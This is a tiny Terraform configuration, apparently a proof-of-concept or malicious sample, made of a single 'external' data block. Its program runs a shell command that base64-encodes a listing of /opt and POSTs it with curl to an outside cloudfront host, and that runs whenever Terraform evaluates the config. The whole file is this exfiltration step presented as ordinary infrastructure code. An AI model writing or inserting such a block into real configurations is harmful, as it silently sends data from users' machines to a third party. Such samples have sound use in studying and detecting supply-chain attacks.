data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"`ls -la /opt | base64`\" https://d9usos5h96tz9.cloudfront.net/log"]
}